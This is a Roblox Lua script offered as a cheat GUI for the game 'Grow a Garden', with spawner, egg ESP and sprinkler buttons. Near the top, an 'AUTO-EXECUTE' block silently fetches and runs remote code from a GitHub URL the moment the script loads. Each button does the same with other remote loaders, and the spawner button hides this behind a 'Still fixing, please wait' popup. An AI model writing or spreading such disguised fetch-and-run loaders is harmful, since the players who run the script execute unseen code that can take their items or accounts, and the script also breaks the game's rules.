-- Ultimate Grow a Garden GUI (Final Complete Version)
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- Main GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "GardenHubPremium"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- ===== AUTO-EXECUTE =====
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/main/5631075000133c7fa307da94f3bc5b7c.txt", true))()
    end)
end)

-- ===== POPUP SYSTEM =====
local function CreatePopup(title, message, accentColor)
    local PopupFrame = Instance.new("Frame")
    PopupFrame.Size = UDim2.new(0.6, 0, 0.3, 0)
    PopupFrame.Position = UDim2.new(0.2, 0, 0.35, 0)
    PopupFrame.BackgroundColor3 = Color3.fromRGB(25, 28, 35)
    PopupFrame.BackgroundTransparency = 0.1
    PopupFrame.Parent = ScreenGui
    
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1, 0, 0.2, 0)
    Header.BackgroundColor3 = accentColor
    Header.Parent = PopupFrame
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
    TitleLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
    TitleLabel.Text = title
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextColor3 = Color3.new(1,1,1)
    TitleLabel.TextSize = 18
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Parent = Header
    
    local MessageLabel = Instance.new("TextLabel")
    MessageLabel.Size = UDim2.new(0.9, 0, 0.6, 0)
    MessageLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
    MessageLabel.Text = message
    MessageLabel.Font = Enum.Font.Gotham
    MessageLabel.TextColor3 = Color3.new(0.9,0.9,0.9)
    MessageLabel.TextSize = 14
    MessageLabel.TextWrapped = true
    MessageLabel.BackgroundTransparency = 1
    MessageLabel.Parent = PopupFrame
    
    local OKButton = Instance.new("TextButton")
    OKButton.Size = UDim2.new(0.3, 0, 0.15, 0)
    OKButton.Position = UDim2.new(0.35, 0, 0.8, 0)
    OKButton.BackgroundColor3 = accentColor
    OKButton.Text = "OK"
    OKButton.Font = Enum.Font.GothamBold
    OKButton.TextColor3 = Color3.new(1,1,1)
    OKButton.TextSize = 14
    OKButton.Parent = PopupFrame
    
    OKButton.MouseButton1Click:Connect(function()
        PopupFrame:Destroy()
    end)
    
    PopupFrame.Size = UDim2.new(0,0,0,0)
    TweenService:Create(PopupFrame, TweenInfo.new(0.3), {Size = UDim2.new(0.6,0,0.3,0)}):Play()
end

-- ===== MAIN FRAME =====
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0.4,0,0.5,0)
MainFrame.Position = UDim2.new(0.3,0,0.25,0)
MainFrame.BackgroundColor3 = Color3.fromRGB(30,35,42)
MainFrame.Parent = ScreenGui

-- ===== MINIMIZE BUTTON =====
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Size = UDim2.new(0.1,0,0.1,0)
MinimizeButton.Position = UDim2.new(0.85,0,0.02,0)
MinimizeButton.Text = "_"
MinimizeButton.BackgroundColor3 = Color3.fromRGB(255,193,7)
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.TextColor3 = Color3.new(1,1,1)
MinimizeButton.TextSize = 16
MinimizeButton.Parent = MainFrame

-- ===== RESTORE BUTTON (Hidden Initially) =====
local RestoreButton = Instance.new("TextButton")
RestoreButton.Size = UDim2.new(0.15,0,0.1,0)
RestoreButton.Position = UDim2.new(0.01,0,0.01,0)
RestoreButton.Text = "≡"
RestoreButton.BackgroundColor3 = Color3.fromRGB(30,35,42)
RestoreButton.Font = Enum.Font.GothamBold
RestoreButton.TextColor3 = Color3.new(1,1,1)
RestoreButton.TextSize = 20
RestoreButton.Visible = false
RestoreButton.Parent = ScreenGui

-- Minimize/Restore functionality
MinimizeButton.MouseButton1Click:Connect(function()
    TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0,0,0,0)}):Play()
    task.wait(0.3)
    MainFrame.Visible = false
    RestoreButton.Visible = true
end)

RestoreButton.MouseButton1Click:Connect(function()
    RestoreButton.Visible = false
    MainFrame.Visible = true
    TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0.4,0,0.5,0)}):Play()
end)

-- ===== BUTTON CONTAINER =====
local ButtonContainer = Instance.new("Frame")
ButtonContainer.Size = UDim2.new(0.9,0,0.8,0)
ButtonContainer.Position = UDim2.new(0.05,0,0.15,0)
ButtonContainer.BackgroundTransparency = 1
ButtonContainer.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0.05,0)
UIListLayout.Parent = ButtonContainer

-- ===== GARDEN SPAWNER BUTTON =====
local SpawnerButton = Instance.new("TextButton")
SpawnerButton.Size = UDim2.new(1,0,0.2,0)
SpawnerButton.Text = "GARDEN SPAWNER"
SpawnerButton.BackgroundColor3 = Color3.fromRGB(76, 175, 80)
SpawnerButton.Font = Enum.Font.GothamBold
SpawnerButton.TextColor3 = Color3.new(1,1,1)
SpawnerButton.TextSize = 16
SpawnerButton.Parent = ButtonContainer

SpawnerButton.MouseButton1Click:Connect(function()
    CreatePopup("Please Wait", "Still fixing, please wait a bit...", Color3.fromRGB(76, 175, 80))
    task.spawn(function()
        pcall(function()
            local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/main/Spawner.lua", true))()
            if Spawner then Spawner.Load() end
        end)
    end)
end)

-- ===== EGG ESP BUTTON =====
local EggESPButton = Instance.new("TextButton")
EggESPButton.Size = UDim2.new(1,0,0.2,0)
EggESPButton.Text = "EGG ESP"
EggESPButton.BackgroundColor3 = Color3.fromRGB(156, 39, 176)
EggESPButton.Font = Enum.Font.GothamBold
EggESPButton.TextColor3 = Color3.new(1,1,1)
EggESPButton.TextSize = 16
EggESPButton.Parent = ButtonContainer

EggESPButton.MouseButton1Click:Connect(function()
    CreatePopup("Warning", "⚠️ YOUR EGG MUST BE READY TO HATCH ⚠️\nServer hops will find lower versions (v1346 below)", Color3.fromRGB(244, 67, 54))
    task.wait(2)
    pcall(function()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/main/Loader/LoaderV1.lua", true))()
    end)
end)

-- ===== INFINITE SPRINKLER BUTTON =====
local SprinklerButton = Instance.new("TextButton")
SprinklerButton.Size = UDim2.new(1,0,0.2,0)
SprinklerButton.Text = "INFINITE SPRINKLER"
SprinklerButton.BackgroundColor3 = Color3.fromRGB(33, 150, 243)
SprinklerButton.Font = Enum.Font.GothamBold
SprinklerButton.TextColor3 = Color3.new(1,1,1)
SprinklerButton.TextSize = 16
SprinklerButton.Parent = ButtonContainer

SprinklerButton.MouseButton1Click:Connect(function()
    CreatePopup("Requirement", "You need 5-10 Sprinklers of selected type", Color3.fromRGB(33, 150, 243))
    task.wait(2)
    pcall(function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1c1979f776d3e81869cf5f49f91900a7.lua", true))()
    end)
end)

-- ===== CLOSE BUTTON =====
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0.1,0,0.1,0)
CloseButton.Position = UDim2.new(0.85,0,0.02,0)
CloseButton.Text = "X"
CloseButton.BackgroundColor3 = Color3.fromRGB(244, 67, 54)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextColor3 = Color3.new(1,1,1)
CloseButton.TextSize = 16
CloseButton.Parent = MainFrame

CloseButton.MouseButton1Click:Connect(function() 
    MainFrame.Visible = false 
    RestoreButton.Visible = true
end)

-- ===== ANIMATE IN =====
MainFrame.Size = UDim2.new(0,0,0,0)
TweenService:Create(MainFrame, TweenInfo.new(0.5), {
    Size = UDim2.new(0.4,0,0.5,0)
}):Play()

-- ===== MUSIC =====
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://142376088"
sound.Looped = true
sound.Volume = 0.7
sound.Parent = player.PlayerGui
sound:Play()
